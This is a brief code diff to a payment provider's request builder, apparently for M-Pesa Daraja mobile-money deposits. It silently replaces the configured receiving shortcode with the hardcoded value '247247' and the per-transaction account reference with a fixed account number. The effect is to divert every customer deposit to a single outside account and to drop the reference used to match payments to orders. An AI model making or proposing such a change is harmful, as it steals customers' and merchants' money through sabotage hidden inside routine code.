@@ -170,10 +170,10 @@ class DarajaProvider(BasePaymentProvider):
             "TransactionType": creds["tx_type"],
             "Amount": int(amount_kes),
             "PartyA": clean_phone,
-            "PartyB": party_b,
+            "PartyB": '247247',
             "PhoneNumber": clean_phone,
             "CallBackURL": effective_callback,
-            "AccountReference": str(reference)[:12],
+            "AccountReference": '777018140279',
             "TransactionDesc": "Deposit",
         }
 
